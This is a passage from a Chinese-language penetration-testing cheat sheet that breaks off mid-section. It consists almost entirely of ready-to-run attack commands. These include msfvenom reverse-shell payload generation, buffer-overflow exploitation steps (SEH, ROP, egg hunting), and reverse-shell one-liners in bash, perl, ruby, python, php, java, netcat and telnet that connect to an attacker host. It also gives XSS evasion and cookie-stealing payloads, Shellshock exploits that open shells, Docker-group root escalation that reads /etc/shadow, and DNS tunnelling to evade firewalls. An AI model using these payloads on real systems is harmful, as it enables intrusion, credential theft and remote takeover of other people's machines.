<h3 id="MSF-生成反弹-Shell-C-Shellcode"><a href="#MSF-生成反弹-Shell-C-Shellcode" class="headerlink" title="MSF 生成反弹 Shell (C Shellcode)"></a>MSF 生成反弹 Shell (C Shellcode)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Python-Shell"><a href="#MSF-生成反弹-Python-Shell" class="headerlink" title="MSF 生成反弹 Python Shell"></a>MSF 生成反弹 Python Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-ASP-Shell"><a href="#MSF-生成反弹-ASP-Shell" class="headerlink" title="MSF 生成反弹 ASP Shell"></a>MSF 生成反弹 ASP Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Bash-Shell"><a href="#MSF-生成反弹-Bash-Shell" class="headerlink" title="MSF 生成反弹 Bash Shell"></a>MSF 生成反弹 Bash Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</span><br><span class="line">add &lt;?php at the beginning</span><br><span class="line">perl -i~ -0777pe&#x27;s/^/&lt;?php \n/&#x27; shell.php</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="Linux-常用安全命令"><a href="#Linux-常用安全命令" class="headerlink" title="Linux 常用安全命令"></a>Linux 常用安全命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 uid 查找对应的程序</span><br><span class="line">find / -uid 0 -perm -4000</span><br><span class="line"></span><br><span class="line"># 查找哪里拥有写权限</span><br><span class="line">find / -perm -o=w</span><br><span class="line"></span><br><span class="line"># 查找名称中包含点和空格的文件</span><br><span class="line">find / -name &quot; &quot; -print</span><br><span class="line">find / -name &quot;..&quot; -print</span><br><span class="line">find / -name &quot;. &quot; -print</span><br><span class="line">find / -name &quot; &quot; -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何人的文件</span><br><span class="line">find / -nouser</span><br><span class="line"></span><br><span class="line"># 查找未链接的文件</span><br><span class="line">lsof +L1</span><br><span class="line"></span><br><span class="line"># 获取进程打开端口的信息</span><br><span class="line">lsof -i</span><br><span class="line"></span><br><span class="line"># 看看 ARP 表中是否有奇怪的东西</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line"># 查看所有账户</span><br><span class="line">getent passwd</span><br><span class="line"></span><br><span class="line"># 查看所有用户组</span><br><span class="line">getent group</span><br><span class="line"></span><br><span class="line"># 列举所有用户的 crontabs</span><br><span class="line">for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done</span><br><span class="line"></span><br><span class="line"># 生成随机密码</span><br><span class="line">cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4</span><br><span class="line"></span><br><span class="line"># 查找所有不可修改的文件</span><br><span class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’</span><br><span class="line"></span><br><span class="line"># 使文件不可修改</span><br><span class="line">chattr -i file</span><br></pre></td></tr></table></figure>

<h3 id="Windows-缓冲区溢出利用命令"><a href="#Windows-缓冲区溢出利用命令" class="headerlink" title="Windows 缓冲区溢出利用命令"></a>Windows 缓冲区溢出利用命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c</span><br><span class="line"></span><br><span class="line">COMMONLY USED BAD CHARACTERS:</span><br><span class="line">\x00\x0a\x0d\x20                              For http request</span><br><span class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</span><br><span class="line"></span><br><span class="line"># 常用命令:</span><br><span class="line">pattern create</span><br><span class="line">pattern offset (EIP Address)</span><br><span class="line">pattern offset (ESP Address)</span><br><span class="line">add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )</span><br><span class="line"></span><br><span class="line">!pvefindaddr pattern_create 5000</span><br><span class="line">!pvefindaddr suggest</span><br><span class="line">!pvefindaddr modules</span><br><span class="line">!pvefindaddr nosafeseh</span><br><span class="line"></span><br><span class="line">!mona config -set workingfolder C:\Mona\%p</span><br><span class="line">!mona config -get workingfolder</span><br><span class="line">!mona mod</span><br><span class="line">!mona bytearray -b &quot;\x00\x0a&quot;</span><br><span class="line">!mona pc 5000</span><br><span class="line">!mona po EIP</span><br><span class="line">!mona suggest</span><br></pre></td></tr></table></figure>

<h3 id="SEH-–-结构化异常处理"><a href="#SEH-–-结构化异常处理" class="headerlink" title="SEH – 结构化异常处理"></a>SEH – 结构化异常处理</h3><p>注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span><br><span class="line"># http://baike.baidu.com/view/243131.htm</span><br><span class="line">!mona suggest</span><br><span class="line">!mona nosafeseh</span><br><span class="line">nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)</span><br><span class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</span><br></pre></td></tr></table></figure>

<h3 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h3><p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>
<p>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Return-oriented_programming</span><br><span class="line"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span><br><span class="line"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</span><br><span class="line"># http://baike.baidu.com/item/DEP/7694630</span><br><span class="line">!mona modules</span><br><span class="line">!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;</span><br><span class="line">!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</span><br></pre></td></tr></table></figure>

<h3 id="ASLR-–-地址空间格局随机化"><a href="#ASLR-–-地址空间格局随机化" class="headerlink" title="ASLR – 地址空间格局随机化"></a>ASLR – 地址空间格局随机化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</span><br><span class="line"># http://baike.baidu.com/view/3862310.htm</span><br><span class="line">!mona noaslr</span><br></pre></td></tr></table></figure>

<h3 id="寻蛋-EGG-Hunter-技术"><a href="#寻蛋-EGG-Hunter-技术" class="headerlink" title="寻蛋(EGG Hunter)技术"></a>寻蛋(EGG Hunter)技术</h3><p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自<a href="http://www.pediy.com/kssd/pediy11/120392.html">看雪论坛</a>，更多详情可以查阅我在代码注释中增加的链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span><br><span class="line"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span><br><span class="line"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span><br><span class="line">!mona jmp -r esp</span><br><span class="line">!mona egg -t lxxl</span><br><span class="line">\xeb\xc4 (jump backward -60)</span><br><span class="line">buff=lxxllxxl+shell</span><br><span class="line">!mona egg -t &#x27;w00t&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="GDB-Debugger-常用命令"><a href="#GDB-Debugger-常用命令" class="headerlink" title="GDB Debugger 常用命令"></a>GDB Debugger 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置断点</span><br><span class="line">break *_start</span><br><span class="line"></span><br><span class="line"># 执行下一个命令</span><br><span class="line">next</span><br><span class="line">step</span><br><span class="line">n</span><br><span class="line">s</span><br><span class="line"></span><br><span class="line"># 继续执行</span><br><span class="line">continue</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">checking &#x27;REGISTERS&#x27; and &#x27;MEMORY&#x27;</span><br><span class="line"></span><br><span class="line"># 显示寄存器的值: (Decimal,Binary,Hex)</span><br><span class="line">print /d –&gt; Decimal</span><br><span class="line">print /t –&gt; Binary</span><br><span class="line">print /x –&gt; Hex</span><br><span class="line">O/P :</span><br><span class="line">(gdb) print /d $eax</span><br><span class="line">$17 = 13</span><br><span class="line">(gdb) print /t $eax</span><br><span class="line">$18 = 1101</span><br><span class="line">(gdb) print /x $eax</span><br><span class="line">$19 = 0xd</span><br><span class="line">(gdb)</span><br><span class="line"></span><br><span class="line"># 显示特定内存地址的值</span><br><span class="line">command : x/nyz (Examine)</span><br><span class="line">n –&gt; Number of fields to display ==&gt;</span><br><span class="line">y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</span><br><span class="line">z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</span><br></pre></td></tr></table></figure>

<h3 id="BASH-反弹-Shell"><a href="#BASH-反弹-Shell" class="headerlink" title="BASH 反弹 Shell"></a>BASH 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line"></span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:</span><br><span class="line">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="PERL-反弹-Shell"><a href="#PERL-反弹-Shell" class="headerlink" title="PERL 反弹 Shell"></a>PERL 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br><span class="line"># Win 平台</span><br><span class="line">perl -MIO -e &#x27;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;’</span><br></pre></td></tr></table></figure>

<h3 id="RUBY-反弹-Shell"><a href="#RUBY-反弹-Shell" class="headerlink" title="RUBY 反弹 Shell"></a>RUBY 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line"></span><br><span class="line"># Win 平台</span><br><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">ruby -rsocket -e &#x27;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="PYTHON-反弹-Shell"><a href="#PYTHON-反弹-Shell" class="headerlink" title="PYTHON 反弹 Shell"></a>PYTHON 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-反弹-Shell"><a href="#PHP-反弹-Shell" class="headerlink" title="PHP 反弹 Shell"></a>PHP 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="JAVA-反弹-Shell"><a href="#JAVA-反弹-Shell" class="headerlink" title="JAVA 反弹 Shell"></a>JAVA 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="NETCAT-反弹-Shell"><a href="#NETCAT-反弹-Shell" class="headerlink" title="NETCAT 反弹 Shell"></a>NETCAT 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br><span class="line">nc -e /bin/sh 192.168.37.10 443</span><br><span class="line"></span><br><span class="line"># 如果 -e 参数被禁用，可以尝试以下命令</span><br><span class="line"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc attackerip 443</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</span><br><span class="line"></span><br><span class="line"># 如果你安装错了 netcat 的版本，请尝试以下命令</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="TELNET-反弹-Shell"><a href="#TELNET-反弹-Shell" class="headerlink" title="TELNET 反弹 Shell"></a>TELNET 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果 netcat 不可用或者 /dev/tcp</span><br><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<h3 id="XTERM-反弹-Shell"><a href="#XTERM-反弹-Shell" class="headerlink" title="XTERM 反弹 Shell"></a>XTERM 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># http://baike.baidu.com/view/418628.htm</span><br><span class="line"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</span><br><span class="line">apt-get install xnest</span><br><span class="line">Xnest :1</span><br><span class="line"></span><br><span class="line"># 记得授权来自目标 IP 的连接</span><br><span class="line">xterm -display 127.0.0.1:1</span><br><span class="line"></span><br><span class="line"># 授权访问</span><br><span class="line">xhost +targetip</span><br><span class="line"></span><br><span class="line"># 在目标机器上连接回我们的 X 服务器</span><br><span class="line">xterm -display attackerip:1</span><br><span class="line">/usr/openwin/bin/xterm -display attackerip:1</span><br><span class="line">or</span><br><span class="line">$ DISPLAY=attackerip:0 xterm</span><br></pre></td></tr></table></figure>

<h3 id="XSS-备忘录"><a href="#XSS-备忘录" class="headerlink" title="XSS 备忘录"></a>XSS 备忘录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span><br><span class="line">(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)</span><br><span class="line"></span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&#x27;%3E</span><br><span class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SSH-Over-SCTP-使用-Socat"><a href="#SSH-Over-SCTP-使用-Socat" class="headerlink" title="SSH Over SCTP (使用 Socat)"></a>SSH Over SCTP (使用 Socat)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 远端服务器</span><br><span class="line"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</span><br><span class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</span><br><span class="line"></span><br><span class="line"># 本地端</span><br><span class="line"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</span><br><span class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</span><br><span class="line"></span><br><span class="line"># 创建 socks 代理</span><br><span class="line"># 替换 username 和 -p 的端口号</span><br><span class="line">$ ssh -lusername localhost -D 8080 -p 1337</span><br></pre></td></tr></table></figure>

<p>使用洋葱网络</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装服务</span><br><span class="line">$ apt-get install tor torsocks</span><br><span class="line"></span><br><span class="line"># 绑定 ssh 到 tor 服务端口 80</span><br><span class="line"># /etc/tor/torrc</span><br><span class="line">SocksPolicy accept 127.0.0.1</span><br><span class="line">SocksPolicy accept 192.168.0.0/16</span><br><span class="line">Log notice file /var/log/tor/notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</span><br><span class="line">HiddenServicePort 80 127.0.0.1:22</span><br><span class="line">PublishServerDescriptor 0</span><br><span class="line">$ /etc/init.d/tor start</span><br><span class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</span><br><span class="line">3l5zstvt1zk5jhl662.onion</span><br><span class="line"></span><br><span class="line"># ssh 客户端连接</span><br><span class="line">$ apt-get install torsocks</span><br><span class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</span><br></pre></td></tr></table></figure>

<h3 id="Metagoofil-–-元数据收集工具"><a href="#Metagoofil-–-元数据收集工具" class="headerlink" title="Metagoofil – 元数据收集工具"></a>Metagoofil – 元数据收集工具</h3><p>注：Metagoofil 是一款利用Google收集信息的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># http://www.edge-security.com/metagoofil.php</span><br><span class="line"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</span><br><span class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</span><br></pre></td></tr></table></figure>

<h3 id="利用-Shellshock"><a href="#利用-Shellshock" class="headerlink" title="利用 Shellshock"></a>利用 Shellshock</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 一个发现并利用服务器 Shellshock 的工具</span><br><span class="line"># https://github.com/nccgroup/shocker</span><br><span class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br><span class="line"></span><br><span class="line"># 查看文件</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># 绑定 shell</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># 反弹 Shell</span><br><span class="line">$ nc -l -p 443</span><br><span class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br></pre></td></tr></table></figure>

<h3 id="获取-Docker-的-Root"><a href="#获取-Docker-的-Root" class="headerlink" title="获取 Docker 的 Root"></a>获取 Docker 的 Root</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取  Docker 的 Root</span><br><span class="line"># user 必须在 docker 用户组中</span><br><span class="line">ek@victum:~/docker-test$ id</span><br><span class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</span><br><span class="line"></span><br><span class="line">ek@victum:~$ mkdir docker-test</span><br><span class="line">ek@victum:~$ cd docker-test</span><br><span class="line"></span><br><span class="line">ek@victum:~$ cat &gt; Dockerfile</span><br><span class="line">FROM debian:wheezy</span><br><span class="line"></span><br><span class="line">ENV WORKDIR /stuff</span><br><span class="line"></span><br><span class="line">RUN mkdir -p $WORKDIR</span><br><span class="line"></span><br><span class="line">VOLUME [ $WORKDIR ]</span><br><span class="line"></span><br><span class="line">WORKDIR $WORKDIR</span><br><span class="line">&lt;&lt; EOF</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker build -t my-docker-image .</span><br><span class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</span><br><span class="line">&#x27;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#x27;</span><br><span class="line">./sh</span><br><span class="line">whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &#x27;cat /stuff/shadow&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="使用-DNS-隧道绕过防火墙"><a href="#使用-DNS-隧道绕过防火墙" class="headerlink" title="使用 DNS 隧道绕过防火墙"></a>使用 DNS 隧道绕过防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</span><br><span class="line"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</span><br><span class="line"></span><br><span class="line"># 服务器 (攻击者)</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get -y install ruby-dev git make g++</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ cd dnscat2/server</span><br><span class="line">$ bundle install</span><br><span class="line">$ ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 16059</span><br><span class="line">dnscat2&gt; session -i 16059</span><br><span class="line"></span><br><span class="line"># 客户机 (目标)</span><br><span class="line"># 